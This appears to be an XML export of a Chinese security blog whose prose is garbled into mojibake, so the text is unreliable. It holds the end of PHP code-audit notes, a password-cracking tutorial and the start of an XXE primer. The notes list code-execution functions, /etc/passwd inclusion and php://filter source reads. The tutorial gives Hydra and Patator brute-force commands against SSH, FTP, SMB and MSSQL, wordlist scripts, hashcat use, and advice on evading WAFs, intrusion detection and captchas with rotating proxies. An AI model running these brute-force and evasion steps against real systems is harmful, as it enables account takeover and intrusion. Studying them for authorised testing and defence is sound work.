·ï¼Œåªæ˜¯å®ƒåªå¯¹ä»æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­è·å–çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ 5.magic_quotes_sybase(é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤)åªæ˜¯å°†å•å¼•å·è½¬ä¸ºåŒå¼•å·ï¼Œè½¬ä¹‰ç©ºå­—èŠ‚ 6.safe_mode=on(å®‰å…¨æ¨¡å¼)PHP5.4ä¹‹åå–æ¶ˆ 7.open_basedir(PHPå¯è®¿é—®ç›®å½•)å¤šä¸ªç”¨;éš”å¼€ 8.disable_functions(ç¦ç”¨å‡½æ•°)ä¾‹å¦‚å¯ä»¥=phpinfoã€evalã€passthruã€execã€system 9.display_errorså’Œerror_reporting=Off(é”™è¯¯æ˜¾ç¤º) å¸¸è§çš„ä»£ç å®¡è®¡æ€è·¯ 1.æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹ 2.æŸ¥æ‰¾å¯æ§å˜é‡ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹ 3.å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç  4.ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç  æ–‡ä»¶ä¸Šä¼ æ—¶å¯ä»¥æµ‹è¯•æ–‡ä»¶åæ˜¯å¦å­˜åœ¨SQLæ³¨å…¥. äºŒæ¬¡æ³¨å…¥åŸç†å›¾,å®ä¾‹è¯·çœ‹sqli-labs-24 SQLè¯·æ±‚å¤´æ³¨å…¥ï¼šuser-agent/referer/client-ip/x-forward-for å¯¹å®½å­—èŠ‚æ³¨å…¥çš„æŒ–æ˜ä¸»è¦çœ‹å¦‚ä¸‹å…³é”®å­—ï¼š SET NAMES character_set_client=gbk mysql_set_charset(&apos;gbk&apos;) äºŒæ¬¡urldecodeæ³¨å…¥ï¼š1.php?id=1%2527 intvalç­‰å­—ç¬¦è½¬æ¢intval(&quot;1&#39; union select &quot;) è¾“å‡ºï¼š1 å…³äºå®½å­—èŠ‚æ³¨å…¥çš„æ¨èè§£å†³æ–¹æ³•ï¼š 1.åœ¨æ‰§è¡ŒæŸ¥è¯¢å‰å…ˆæ‰§è¡ŒSET NAMES &apos;gbk&apos;è®¾ç½®ç¼–ç ï¼Œè®¾ç½®character_set_client=binary 2.ä½¿ç”¨mysql_set_charset(&apos;gbk&apos;)è®¾ç½®ç¼–ç ï¼Œç„¶åä½¿ç”¨mysql_real_escasp_string()å‡½æ•°è¿‡æ»¤å‚æ•° 3.ä½¿ç”¨pdoæ–¹å¼ï¼Œåœ¨PHP5.3.6åŠä»¥ä¸‹ç‰ˆæœ¬éœ€è¦è®¾ç½®setAttributeæ¥ç¦ç”¨prepared statementsçš„é˜²çœŸæ•ˆæœ å¯¹äºCSRFçš„é˜²å¾¡ï¼š 1.å¢åŠ token/refereréªŒè¯é¿å…imgæ ‡ç­¾è¯·æ±‚çš„æ”»å‡» 2.å¢åŠ éªŒè¯ç  Tokenå®ç°æµ‹è¯•ä»£ç ï¼š &lt;?php session_start(); function set_token() { $_SESSION[&apos;token&apos;] = md5(time()+rand(1,1000)); echo $_SESSION[&apos;token&apos;]; echo &apos;&lt;/br&gt;&apos;; } function check_token() { if(isset($_POST[&apos;token&apos;])&amp;&amp;$_POST[&apos;token&apos;] === $_SESSION[&apos;token&apos;]) return true; else return false; } if(isset($_SESSION[&apos;token&apos;])&amp;&amp;check_token()) { echo &quot;success&quot;; echo &apos;&lt;/br&gt;&apos;; } else { echo &quot;failed&quot;; echo &apos;&lt;/br&gt;&apos;; } set_token(); ?&gt; &lt;form method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?=$_SESSION[&apos;token&apos;]?&gt;&quot;&gt; &lt;input type=&quot;submit&quot;/&gt; &lt;/form&gt; æ–‡ä»¶åŒ…å«å‡½æ•°çš„åŒºåˆ«ï¼š include()ã€include_once()åœ¨æ–‡ä»¶åŒ…å«æ—¶å³ä½¿é‡åˆ°é”™è¯¯ï¼Œä¸‹é¢çš„ä»£ç ä¾ç„¶ä¼šç»§ç»­æ‰§è¡Œ require()ã€require_once()åˆ™ä¼šç›´æ¥æŠ¥é”™é€€å‡ºç¨‹åº windowsä¸‹å¯ä»¥åŒ…å«æ—¥å¿—æ–‡ä»¶ linuxä¸‹å¯ä»¥åŒ…å«/proc/self/environ(é“¾æ¥å½“å‰æ­£åœ¨è¿è¡Œç¯å¢ƒçš„è¿›ç¨‹)ã€/etc/passwd(å¯†ç æ–‡ä»¶) ç­‰æ–‡ä»¶ php://filter/ PHPè¾“å…¥è¾“å‡ºæµè¯»å–æ–‡ä»¶ æ–‡ä»¶ä¸Šä¼ å‡½æ•°move_uploaded_file() åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œåœ¨æ–‡ä»¶ååé¢åŠ ä¸ªç©ºæ ¼ï¼ˆ%20,æˆ–è€…%81-%99)ï¼Œæœ‰æ—¶å€™å¯ä»¥ç»•è¿‡é»‘åå•é™åˆ¶ã€‚ æ–‡ä»¶ä¸Šä¼ é˜²å¾¡ï¼š 1.ç™½åå•æ–¹å¼è¿‡æ»¤æ–‡ä»¶æ‰©å±•åï¼Œä½¿ç”¨in_arrayæˆ–è€…===æ¥å¯¹æ¯”æ‰©å±•å 2.ä¿å­˜æ–‡ä»¶æ—¶é‡å‘½åæ–‡ä»¶ï¼Œæ–‡ä»¶å‘½åè§„åˆ™é‡‡ç”¨æ—¶é—´æˆ³çš„æ‹¼æ¥éšæœºæ•°çš„MD5æ–¹å¼&quot;md5(time()+rand(1,1000))&quot;. ä»£ç æ‰§è¡Œæ¼æ´å‡½æ•°ï¼š eval(),assert(),preg_replace(),call_user_func(),call_user_func_array(),array_map() mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )æœç´¢subjectä¸­åŒ¹é…pattern,ç”¨replacementæ›¿æ¢ã€‚å¦‚æœpatternå¤„å­˜åœ¨/eå‚æ•°ï¼Œåˆ™replacementçš„å€¼ä¼šè¢«å½“æˆPHPä»£ç æ¥æ‰§è¡Œã€‚ å‘½ä»¤æ‰§è¡Œæ¼æ´å‡½æ•°ï¼š system(),exec(),shell_exec(),passyhru(),pcntl_exec(),popen(),proc_open(),` å‘½ä»¤æ‰§è¡Œé˜²æ³¨å…¥å‡½æ•°ï¼š escapeshellcmd(),è¿‡æ»¤æ•´æ¡å‘½ä»¤(åŠ ^) &lt;?php echo (escapeshellcmd($_GET[&apos;cmd&apos;])); ?&gt; ?cmd=whoami() è¾“å‡ºï¼šwhoami^() escapesshellarg(),ä¿è¯ä¼ å…¥å‘½ä»¤çš„å‚æ•°æ˜¯ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å­˜åœ¨ &lt;?php echo &apos;ls &apos;.escapeshellarg(&apos;cmd&quot;&apos;); ?&gt; è¾“å‡ºï¼šls &quot;cmd &quot; is_numeric()å‡½æ•°ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡ ==åœ¨åˆ¤æ–­ä¹‹å‰å…ˆåšå˜é‡ç±»å‹è½¬æ¢ï¼Œå³åªåˆ¤æ–­å€¼ ===ä¸ä¼šè½¬æ¢ï¼Œå³æ—¢åˆ¤æ–­å€¼è¿˜åˆ¤æ–­ç±»å‹ %00=NULL=0 httpå¤´æ³¨å…¥å¸¸è§çš„:user-agent,referer,client-ip/x-forward-for $_SERVERå’Œ$_FILESå˜é‡ä¸å—GPCä¿æŠ¤ æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯çš„å‡½æ•°å¼€å…³:display_errorså’Œerror_reporting PHPæ˜¯åŸºäºCå¼€å‘ï¼Œ%00åœ¨URLç¼–ç åå¸‚\0ï¼Œ\0åœ¨Cè¯­è¨€ä¸­æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸç¬¦ã€‚ iconvå‡½æ•°å­—ç¬¦ç¼–ç è½¬æ¢è¿‡ç¨‹ä¸­é‡åˆ°ä¸èƒ½å¤„ç†çš„å­—ç¬¦ä¸²åˆ™åç»­çš„å­—ç¬¦ä¸²ä¹Ÿä¸ä¼šå¤„ç†ï¼Œå¯¼è‡´æˆªæ–­ï¼ˆchar(128)åˆ°char(255)ä¹‹é—´éƒ½å¯ä»¥ï¼‰ php://è¾“å…¥è¾“å‡ºæµ php://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå³å¯ä»¥ç›´æ¥è¯»å–åˆ°POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚ php://outputæ˜¯ä¸€ä¸ªåªå†™æµï¼Œå°†æµæ•°æ®è¾“å‡º php://filteræ˜¯ä¸€ä¸ªæ–‡ä»¶æ“ä½œåè®®ï¼Œå¯ä»¥å¯¹ç£ç›˜ä¸­çš„æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œ php://filter/write=string.rot13/resource=example.txt,&quot;hello world&quot; php://filter/convert.base64-encode/resource=index.php PHPä»£ç è§£ææ ‡ç­¾ è„šæœ¬æ ‡ç­¾: &lt;script language=&quot;php&quot;&gt;...&lt;/script&gt; çŸ­æ ‡ç­¾ï¼š&lt;?...?&gt;,éœ€è¦php.iniä¸­short_open_tag=on,é»˜è®¤æ˜¯on aspæ ‡ç­¾ï¼š&lt;%...%&gt;,éœ€è¦php.iniä¸­asp_tags=onï¼Œé»˜è®¤æ˜¯off client-ipçš„æ­£åˆ™è§„åˆ™ï¼š^\d+\.\d+\.\d+\.\d+$ test.php%00jpg mysqlæŠ¥é”™æ³¨å…¥çš„å‡½æ•°ï¼šfloor(),updatexml(),extractvalue() å…·ä½“ä»‹ç»è¯·å‚è€ƒï¼šMySqlæ³¨å…¥æ€»ç»“ windows findfirstfileåˆ©ç”¨ï¼šå³ä½¿ç”¨&lt;,&gt;æ¥ä»£æ›¿ä¸å¯çŸ¥çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œå¦‚123.txtå¯ä»¥ä½¿ç”¨1&lt;&lt;æ¥æ›¿æ¢ã€‚ PHPä¸­å•å¼•å·ä»£è¡¨çº¯å­—ç¬¦ä¸²ï¼ŒåŒå¼•å·åˆ™æ˜¯ä¼šè§£æä¸­é—´çš„å˜é‡ï¼š &lt;?php $a=&quot;${@phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º@ &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºç©ºæ ¼ &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºTAB &lt;?php $a=&quot;${/**/phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºæ³¨é‡Šç¬¦ &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦æ¢è¡Œ &lt;?php $a=&quot;${+phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º+ &lt;?php $a=&quot;${-phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º- &lt;?php $a=&quot;${!phpinfo()}&quot;;?&gt; #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºï¼ æ­¤å¤–è¿˜æœ‰~ï¼Œ\ç­‰ å¯¹ç§°åŠ å¯†ç®—æ³•ï¼šDES,3DES,TDEA,RC2,RC4,IDEA,AES éå¯¹ç§°åŠ å¯†ï¼šRSA å•å‘åŠ å¯†ï¼šMD4,MD5,sha1 éªŒè¯ç ç»•è¿‡ï¼š 1.ä¸åˆ·æ–°ç›´æ¥ç»•è¿‡ 2.æš´åŠ›ç ´è§£ 3.æœºå™¨è¯†åˆ« 4.æ‰“ç å¹³å° ç”¨æˆ·ç™»å½•æ¼æ´ï¼š 1.æ’åº“æ¼æ´ ç”¨æˆ·åå¯†ç é”™è¯¯æ¬¡æ•°éƒ½æ— é™åˆ¶ å•æ—¶é—´æ®µå†…ç”¨æˆ·çš„å¯†ç é”™è¯¯æ¬¡æ•°é™åˆ¶ å•æ—¶é—´æ®µå†…IPç™»é™†é”™è¯¯æ¬¡æ•°é™åˆ¶ 2.APIç™»é™† æœ€åé™„ä¸Šä¸€ä¸ªæœé›†çš„PHPä»£ç å®¡è®¡è„‘å›¾]]></content>
      <tags>
        <tag>XSS</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>PHP</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
        <tag>å®‰å…¨å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€æµ‹è¯•:å¯†ç ç ´è§£æ€»ç»“]]></title>
    <url>%2F2016%2F08%2F17%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x00 å‰è¨€ä¸€æ¬¡æ¸—é€æµ‹è¯•çš„è¿‡ç¨‹æ€»ä¼šæ¶‰åŠåˆ°â€å¯†ç â€ä¸â€åŠ è§£å¯†â€.åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­,å¯¹å¼±å£ä»¤çš„å°è¯•æ˜¯å¿…ä¸å¯å°‘çš„è¿‡ç¨‹ã€‚ 0x01 æ•´ç†ä¸€ä»½ä¼˜ç§€çš„å­—å…¸æƒ³ç ´è§£å¯†ç ,è¦æ±‚æˆ‘ä»¬å·²ç»â€æ‹¥æœ‰â€åˆ«äººçš„å¯†ç .è¦æ•´ç†ä¸€ä»½ä¼˜ç§€çš„å­—å…¸,å¯ä»¥å‚è€ƒå„å¤§ç½‘ç«™æ³„æ¼æ•°æ®åº“,å°†å¯†ç (æ˜æ–‡)å­—æ®µæ”¶é›†å,ä¾å‡ºç°é¢‘ç‡å…ˆåç”Ÿæˆå­—å…¸. è¿™é‡Œä½¿ç”¨ä¸€ä¸ªå¯¹å·²çŸ¥çš„å­—å…¸æ–‡ä»¶æ ¹æ®ä½¿ç”¨é¢‘ç‡æ’åºå¹¶è¾“å‡ºçš„pythonè„šæœ¬ï¼š #!/bin/bash/python #+------------------------------+ #@Author:Joy_nick #@Blog:http://byd.dropsec.xyz/ #+------------------------------+ import sys from collections import Counter file = open(sys.argv[1], &apos;r&apos;) readlist = [] count_times = [] for line in file.readlines(): line = line.strip(&apos;\r\n &apos;) readlist.append(line) sortlist = Counter(readlist).most_common() for line in sortlist: print line[0] ç¤ºä¾‹ï¼š 0x02 ä¸€æ‰‹ç§°å¿ƒå¦‚æ„çš„å·¥å…·é›†æ¬²å–„å…¶äº‹,é¡»åˆ©å…¶å™¨.å¯†ç æšä¸¾å·¥å…·ä¸¾ä¸€äº›ä¾‹å­ï¼š Hydra :å„ç§æœåŠ¡è´¦æˆ·å¯†ç çŒœè§£ Medusa : ç±»ä¼¼Hydra Patator : Pythonå¤šåè®®ï¼Œå…¨èƒ½æš´åŠ›ç ´è§£ï¼Œæ¨¡å—åŒ–è®¾è®¡æµ‹è¯•å·¥å…· Hashcat : GPUå“ˆå¸Œç ´è§£ BurpSuite : å¤šçº¿ç¨‹å¯†ç æšä¸¾ Rcracki : å½©è™¹è¡¨å“ˆå¸Œç ´è§£ Ophcrack : ç¦»çº¿LMHash/NTHashç ´è§£ Fcrackzip/Truecrackç­‰ç‰¹å®šæ–‡ä»¶å¯†ç ç ´è§£å·¥å…· Metasploit : å„ç§è¾…åŠ©æµ‹è¯•è„šæœ¬ Cupp.py : ç¤¾å·¥å­—å…¸ç”Ÿæˆ â€¦ 0x03 ç»•è¿‡æ£€æµ‹Webå±‚æœ‰WAF,Serviceæœ‰IDS/IPS,åœ¨æµ‹è¯•çš„æ—¶å€™å¾ˆå®¹æ˜“è¢«å‘ç°ã€‚åœ¨æµ‹è¯•å‰,å…ˆé€šè¿‡æ‰«æç­‰æ–¹å¼åˆ¤æ–­æ˜¯å¦æœ‰ç›¸åº”çš„é˜²æŠ¤,å¹¶é‡‡å–ç›¸åº”æ‰‹æ®µ.Webå±‚å¯èƒ½æœ‰éªŒè¯ç ,å¯èƒ½æœ‰æ¯ç§’IPè¿æ¥æ•°é™åˆ¶,å¯èƒ½é€šè¿‡Cookie/Headerç­‰ä¿¡æ¯åˆ¤æ–­è¡Œä¸º.åœ¨é€šè¿‡ä¸€ç³»åˆ—æµ‹è¯•å,(å¦‚ä½•æµ‹è¯•è¿˜æ˜¯è¦è‡ªå·±æ¢ç´¢çš„),é‡‡ç”¨æœ€åˆç†çš„é’ˆå¯¹æ–¹å¼ç»•è¿‡æˆ–å°½é‡é¿å…è¢«æ£€æµ‹è€Œæ‹¦æˆªæšä¸¾è´¦æˆ·å¯†ç ã€‚ 0x04 Webè´¦æˆ·æšä¸¾Webè´¦æˆ·æšä¸¾æ˜¯å¹³æ—¥é‡åˆ°è¾ƒå¤šçš„æƒ…å†µ æ²¡æœ‰åšä¸¥è°¨çš„éªŒè¯ç ç­‰é˜²æŠ¤. å‘ç°åˆ«äººç•™ä¸‹çš„backdoor. æ’åº“æ‰«å·. å¸¸è§çš„ç»•è¿‡éªŒè¯çš„å¯èƒ½: é¡µé¢æ— éœ€åˆ·æ–°éªŒè¯ç æ— é™æ¬¡ä½¿ç”¨ å¯†ç è¾“å…¥é”™è¯¯æ•°æ¬¡å¼¹å‡ºéªŒè¯ç ï¼Œä½†æ›´æ¢è´¦å·ä¸ä¼šå‡ºç°éªŒè¯ç  ä¿®æ”¹Cookieæˆ–User-Agentä¼ªè£…é€ƒé¿éªŒè¯ç  å¯æ‰¹é‡è½®è¯¢ä½¿ç”¨ä»£ç†ipæšä¸¾ç»•è¿‡ åœ¨Webæšä¸¾ä¸­,ä½¿ç”¨BurpSuiteåŸºæœ¬å¯ä»¥è§£å†³æ‰€æœ‰å¸¸è§é—®é¢˜. å¼€å¯ä»£ç†,æ‰“å¼€Intercept,ç™»é™†ç½‘é¡µ,è¾“å…¥ç”¨æˆ·å¯†ç ,æ•°æ®åŒ…æ‹¦æˆªä¸‹æ¥,é€‰æ‹©Send to Intruder,è¿›å…¥æ”»å‡»æ¨¡å—. å…¶ä¸­å››ç§æ¨¡å¼: Sniper:åªæœ‰ä¸€ä¸ªpayload,ä¼šå°†payloadåˆ†åˆ«æ”¾åœ¨æ¯ä¸ªFuzzç‚¹æµ‹è¯•,é»˜è®¤é€‰é¡¹,è¿™ä¹Ÿæ˜¯æ–°æ‰‹å‘ç°Payloadåªèƒ½é€‰æ‹©1çš„åŸå› . Battering Ram:åªæœ‰ä¸€ä¸ªpayload,ä¼šå°†payloadåŒæ—¶æ”¾åœ¨å¤šä¸ªFuzzç‚¹æµ‹è¯•. Pitchfork:å¤šä¸ªpayload,ä¼šå°†å¤šä¸ªpayloadåŒä¸€è¡ŒåŒæ—¶æ”¾åˆ°ç›¸åº”Fuzzç‚¹æµ‹è¯•.(é€‚ç”¨æ‰«å·) Cluster Bomb:å¤šä¸ªpayload,payloadåœ¨å…¶Fuzzç‚¹å¾ªç¯æµ‹è¯•,ç›´åˆ°å°è¯•æ‰€æœ‰å¯èƒ½.(é€‚ç”¨å¤šè´¦æˆ·æšä¸¾å¯†ç ) é€‰æ‹©å¥½ç›¸åº”æ¨¡å¼å,è®¾ç½®payloadä¸ºruntime file,æŒ‚è½½å­—å…¸æ–‡ä»¶.å–æ¶ˆPayload Encoding. å¦‚æœå‘ç°ç½‘é¡µæœ‰å°†ç”¨æˆ·çš„æœ¬åœ°å°†å¯†ç è®¡ç®—MD5åæäº¤,åˆ™éœ€è¦åœ¨Payload Processingä¸­æ·»åŠ è®¡ç®—MD5çš„è¿‡ç¨‹. è®¾ç½®å¥½åä¹Ÿå¯æ·»åŠ æ­£åˆ™åŒ¹é…ç»“æœç­‰ç­‰.ä¹‹åå¯ä»¥Start attackäº†. è¿™ä¸ªè¿‡ç¨‹ä¸­,å¦‚æœæ‹…å¿ƒIPåœ°å€æš´éœ²,å¯ä»¥é€‰æ‹©åŠ å…¥ä¸€ä¸ªclient-ipè¿™ä¸ªpayloadæ¥ä»£ç†ipã€‚ 0x05 HTTPåŸºç¡€è®¤è¯æŠ“åŒ…å¯ä»¥çœ‹åˆ°,ä»¥é»˜è®¤ç”¨æˆ·åadmin,é»˜è®¤å¯†ç adminç™»é™†è·¯ç”±,HTTP Headerå¤šçš„éƒ¨åˆ†åƒæ˜¯è¿™æ ·: Authorization: Basic YWRtaW46YWRtaW4= Base64è§£å¯†å³ä¸ºadmin:admin.é’ˆå¯¹åŸºç¡€è®¤è¯å¯†ç ç ´è§£,ä¾æ—§å¯ä»¥ä½¿ç”¨,ä½†éœ€è¦å¯¹ç”¨æˆ·åå¯†ç å…ˆåšå¤„ç†å³å…ˆbase64ç¼–ç ä¸‹,ä¸€ä¸ªdemoè„šæœ¬å¦‚ä¸‹: #!/usr/bin/python #+------------------------------+ #@Author:Joy_nick #@Blog:http://byd.dropsec.xyz/ #+------------------------------+ import os.path,sys,base64 userfile = raw_input(&quot;input usr file:&quot;) passfile = raw_input(&quot;input pwd file:&quot;) outputfile = raw_input(&quot;input out file:&quot;) outputfile = open(outputfile, &quot;w&quot;) userInfile = open(userfile) passInfile = open(passfile) userLines = userInfile.readlines() passLines = passInfile.readlines() for userLine in userLines: for passLine in passLines: combinedLine = userLine.strip() + &apos;:&apos; + passLine.strip() print combinedLine outputfile.write(base64.b64encode(combinedLine) + &apos;\n&apos;) userInfile.close() passInfile.close() outputfile.close() ç”Ÿæˆå­—å…¸åä»¥Burpçˆ†ç ´å³å¯. ä¹Ÿå¯ä»¥ä½¿ç”¨Hydra hydra -L user.txt -P pass.txt -F http://demourl:2048/auth å…¶ä¸­-Lå’Œ-På¤§å†™å‡ä¸ºæŒ‚è½½å­—å…¸,-Fè¡¨ç¤ºå…¨å±€ä¸€æ—¦å‘ç°åˆæ³•ç”¨æˆ·å¯†ç å³åœæ­¢ç ´è§£,äº¦å¯åŠ å…¥-tå‚æ•°æŒ‡å®šçº¿ç¨‹æ•°. 0x06 æœåŠ¡å¯†ç ç ´è§£å¸¸è§æœåŠ¡å¦‚FTP/SSH/TELNET/POP3/1433ç­‰çš„ç ´è§£æšä¸¾. FTP hydra -L user.txt -P pass.txt -F ftp://127.0.0.1:21 SSH hydra -L user.txt -P pass.txt -F ssh://127.0.0.1:22 patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -x ignore:mesg=&apos;Authentication failed.&apos; SMB hydra -L user.txt -P pass.txt -F smb://127.0.0.1 MSSQL hydra -L user.txt -P pass.txt -F mssql://127.0.0.1:1433 0x07 ç¤¾å·¥å­—å…¸ç”Ÿæˆä»¥cupp.pyå·¥å…·ä¸ºä¾‹,åˆ›å»ºæ–°å­—å…¸ä½¿ç”¨: python cupp.py -i ç”¨æ³•ï¼š cupp.py [é€‰é¡¹] h å¸®åŠ© i äº¤äº’å¼å¡«å†™ç”¨æˆ·å¯†ç ç­‰ç›¸å…³ä¿¡æ¯ w é…ç½®ç°æœ‰çš„å­—å…¸æ–‡ä»¶ l ä»åº“ä¸­ä¸‹è½½ a ç›´æ¥ä½¿ç”¨Alectoæ•°æ®åº“çš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç  v ç‰ˆæœ¬ä¿¡æ¯ åœ¨å¡«å†™ç›¸å…³ä¿¡æ¯åç”Ÿæˆå­—å…¸,ç„¶åå°±å¯ä»¥æšä¸¾äº†ã€‚ 0x08 å“ˆå¸Œç ´è§£æ™®é€šå“ˆå¸Œå¯ä»¥ä½¿ç”¨Ophcrackç ´è§£,å®˜ç½‘ç»™å‡ºäº†å¯¹åº”çš„å½©è™¹è¡¨ä¸‹è½½,å½“ç„¶,ä¹Ÿå¯ä»¥ç›´æ¥æŸ¥è¯¢. http://www.objectif-securite.ch/en/ophcrack.php éœ€è¦ç ´è§£å…¶ä»–ä¸å¸¸è§å¯†ç å“ˆå¸Œ(å€ŸåŠ©å·²æœ‰webç ´è§£æœåŠ¡æ— æ³•è§£å†³),æš‚æ—¶ä¾¿åªæœ‰ä¸‰ä¸ªç›¸å¯¹é«˜æ•ˆçš„æ–¹æ³•: åˆ†å¸ƒå¼ GPU å½©è™¹è¡¨ (æ²¡ç¡¬ç›˜çš„å°±åˆ«æƒ³äº†) è€Œå¦‚æœæˆ‘ä»¬åœ¨çŸ¥é“å¯†ç çš„ä¸€å®šè§„åˆ™å,äº¦å¯æŒ‰ç…§è§„åˆ™ç ´è§£å¯†ç . hashcat -m1800 -a3 hashdumpedfile --pw-min=7 --pw-max=11 &quot;hahaha?l?l?l?l&quot; å…·ä½“çš„hashcatå¯†ç ç ´è§£è¯¦æƒ…è¯·å‚è€ƒï¼šHashCatä½¿ç”¨æ‰‹å†Œ 0x09 æ–‡ä»¶å¯†ç å¯¹äºzipæ–‡ä»¶,ç”±äºåŠ å¯†æ–¹å¼æ²¡æœ‰rarå¼ºåŠ¿,æ•…è¢«è§£å¯†çš„å¯èƒ½æ€§å¾ˆå¤§,ä¸€ä¸ªkaliä¸‹çš„ç ´è§£å·¥å…·å‘½ä»¤å¦‚ä¸‹: fcrackzip -b -v -c a -l 1-4 -u 1.zip -bæŒ‡å®šæš´åŠ›ç ´è§£,-væ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯,-c aæŒ‡å®šå¯†ç ä¸ºçº¯å­—æ¯,-l 1-4æŒ‡å®šå¯†ç é•¿åº¦ä½1-4ä½,-uæŒ‡ä½¿ç”¨å¯èƒ½çš„å¯†ç è¿›è¡Œè§£å‹ç¼©æµ‹è¯•(åŠ ä¸Š,å¦åˆ™ä¼šå‡ºç°å¾ˆå¤šå¹²æ‰°å¯†ç ) å…·ä½“çš„å…¶ä»–è¯­æ³•è¯·å‚è€ƒï¼šfcrackzipè¯­æ³•ç¤ºä¾‹]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE Injectæ”»å‡»ä¸é˜²å¾¡]]></title>
    <url>%2F2016%2F08%2F16%2FXXE-Inject%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x00 å‰è¨€XXE Injectionå³XML External Entity Injection,ä¹Ÿå°±æ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡». åœ¨XML1.0æ ‡å‡†â¾¥é‡Œ,XMLæ–‡æ¡£ç»“æ„é‡Œå®šä¹‰äº†å®ä½“(entity)è¿™ä¸ªæ¦‚å¿µ.å®ä½“å¯ä»¥é€šè¿‡é¢„å®šä¹‰åœ¨æ–‡æ¡£ä¸­è°ƒç”¨,å®ä½“çš„æ ‡è¯†ç¬¦å¯è®¿é—®æœ¬åœ°æˆ–è¿œç¨‹å†…å®¹.å¦‚æœåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¼•å…¥äº†â€æ±¡æŸ“â€æº,åœ¨å¯¹XMLæ–‡æ¡£å¤„ç†ååˆ™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„æ¼ç­‰å®‰å…¨é—®é¢˜. 0x01 ç®€ä»‹DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ &lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; &lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt; DTDå®ä½“entityï¼Œä¸€èˆ¬åˆ†ä¸ºå‚æ•°å®ä½“(å¤–éƒ¨å®ä½“)å’Œå†…éƒ¨å®ä½“ï¼›å‚æ•°å®ä½“æ˜¯ä¸€ç§åªèƒ½åœ¨DTDä¸­å®šä¹‰å’Œä½¿ç”¨çš„å®ä½“ï¼Œä¸€èˆ¬å¼•ç”¨æ—¶ä½¿ç”¨%ä½œä¸ºå‰ç¼€ï¼›å†…éƒ¨å®ä½“æ˜¯æŒ‡ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨. &lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; &lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; æ‰€ä»¥åœ¨XMLä¸­å®ä½“çš„ç”¨æ³•å¦‚ä¸‹ï¼š ENTITYçš„å®šä¹‰è¯­æ³•ï¼š &lt;!DOCTYPE filename [ &lt;!ENTITY entity-name &quot;entity-content&quot; ]&gt; //è¿™å°±æ˜¯DTDäº† 